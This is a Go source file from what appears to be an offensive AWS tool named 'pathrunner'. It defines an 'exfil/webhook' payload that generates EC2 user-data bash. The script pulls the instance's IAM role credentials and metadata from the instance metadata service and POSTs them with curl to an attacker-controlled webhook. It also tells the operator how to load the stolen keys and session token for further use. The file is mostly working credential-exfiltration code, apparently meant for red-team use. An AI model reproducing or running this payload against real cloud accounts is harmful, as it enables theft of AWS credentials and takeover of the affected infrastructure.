package ec2

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type ExfilWebhookPayload struct{}

func NewExfilWebhookPayload() *ExfilWebhookPayload {
	return &ExfilWebhookPayload{}
}

func init() {
	payloads.Register(NewExfilWebhookPayload())
}

func (p *ExfilWebhookPayload) GetName() string {
	return "exfil/webhook"
}

func (p *ExfilWebhookPayload) GetDescription() string {
	return "Exfiltrate EC2 instance role credentials to attacker-controlled webhook"
}

func (p *ExfilWebhookPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueExfil,
		payloads.TagTransportWebhook,
	}
}

func (p *ExfilWebhookPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "WEBHOOK_URL",
			Description: "Target webhook URL for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "INCLUDE_METADATA",
			Description: "Include additional instance metadata (hostname, region, etc.)",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "USER_AGENT",
			Description: "Custom User-Agent for HTTP requests",
			Required:    false,
			Default:     "AWS-EC2-Instance",
		},
	}
}

func (p *ExfilWebhookPayload) GenerateCode(options map[string]string) (string, error) {
	webhookURL := options["WEBHOOK_URL"]
	includeMetadata := options["INCLUDE_METADATA"] != "false" // default true
	userAgent := options["USER_AGENT"]
	if userAgent == "" {
		userAgent = "AWS-EC2-Instance"
	}

	metadataCode := ""
	if includeMetadata {
		metadataCode = `
# Collect additional metadata
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
HOSTNAME=$(curl -s http://169.254.169.254/latest/meta-data/hostname)
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
AVAILABILITY_ZONE=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)

METADATA_JSON=$(cat <<METADATA
{
  "instance_id": "$INSTANCE_ID",
  "hostname": "$HOSTNAME",
  "region": "$REGION",
  "availability_zone": "$AVAILABILITY_ZONE",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
METADATA
)
`
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-exfil.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Credential Exfiltration Payload"
echo "Target Webhook: %s"
echo ""

# Wait for IAM role to be available
echo "Waiting for instance role to be available..."
sleep 15

# Get the role name attached to this instance
echo "Discovering attached IAM role..."
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

if [ -z "$ROLE_NAME" ]; then
    echo "ERROR: No IAM role attached to this instance"
    exit 1
fi

echo "Found role: $ROLE_NAME"

# Retrieve temporary credentials from instance metadata service
echo "Retrieving temporary credentials..."
CREDENTIALS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

if [ -z "$CREDENTIALS" ]; then
    echo "ERROR: Could not retrieve credentials"
    exit 1
fi

echo "Credentials retrieved successfully"
%s
# Prepare payload
PAYLOAD=$(cat <<PAYLOAD
{
  "type": "ec2_credential_exfiltration",
  "role_name": "$ROLE_NAME",
  "credentials": $CREDENTIALS%s
}
PAYLOAD
)

# Send credentials to webhook
echo "Exfiltrating credentials to webhook..."
RESPONSE=$(curl -s -w "%%{http_code}" -o /tmp/webhook_response.txt \
  -X POST \
  -H "User-Agent: %s" \
  -H "Content-Type: application/json" \
  -H "X-Pathrunner: ec2-exfil" \
  -d "$PAYLOAD" \
  "%s")

HTTP_CODE="${RESPONSE: -3}"

if [ "$HTTP_CODE" -eq 200 ]; then
    echo "SUCCESS: Credentials exfiltrated successfully (HTTP 200)"
    cat /tmp/webhook_response.txt
else
    echo "WARNING: Webhook returned HTTP $HTTP_CODE"
    cat /tmp/webhook_response.txt
fi

echo "Exfiltration complete"
`, webhookURL, metadataCode, func() string {
		if includeMetadata {
			return `,
  "metadata": $METADATA_JSON`
		}
		return ""
	}(), userAgent, webhookURL)

	return userDataScript, nil
}

func (p *ExfilWebhookPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Credential Exfiltration Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nExfiltration Status:\n")
	output.WriteString("The EC2 instance will automatically exfiltrate credentials to your webhook.\n")
	output.WriteString("Credentials should arrive within 1-2 minutes.\n\n")

	output.WriteString("Expected Payload Structure:\n")
	output.WriteString("{\n")
	output.WriteString("  \"type\": \"ec2_credential_exfiltration\",\n")
	output.WriteString("  \"role_name\": \"<ROLE_NAME>\",\n")
	output.WriteString("  \"credentials\": {\n")
	output.WriteString("    \"AccessKeyId\": \"ASIA...\",\n")
	output.WriteString("    \"SecretAccessKey\": \"...\",\n")
	output.WriteString("    \"Token\": \"...\",\n")
	output.WriteString("    \"Expiration\": \"2025-01-01T00:00:00Z\"\n")
	output.WriteString("  }\n")
	output.WriteString("}\n\n")

	output.WriteString("To use the exfiltrated credentials:\n")
	output.WriteString("1. Check your webhook endpoint for the credential payload\n")
	output.WriteString("2. Extract AccessKeyId, SecretAccessKey, and Token\n")
	output.WriteString("3. Configure AWS CLI or add to pathrunner with:\n")
	output.WriteString("   identity add --access <ACCESS_KEY> --secret <SECRET_KEY> --token <TOKEN>\n\n")

	output.WriteString("To check exfiltration logs:\n")
	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")

	return output.String(), nil
}

func (p *ExfilWebhookPayload) Validate(options map[string]string) error {
	if options["WEBHOOK_URL"] == "" {
		return fmt.Errorf("WEBHOOK_URL is required for exfil/webhook payload")
	}

	// Basic URL validation
	webhookURL := options["WEBHOOK_URL"]
	if !strings.HasPrefix(webhookURL, "http://") && !strings.HasPrefix(webhookURL, "https://") {
		return fmt.Errorf("WEBHOOK_URL must start with http:// or https://")
	}

	return nil
}
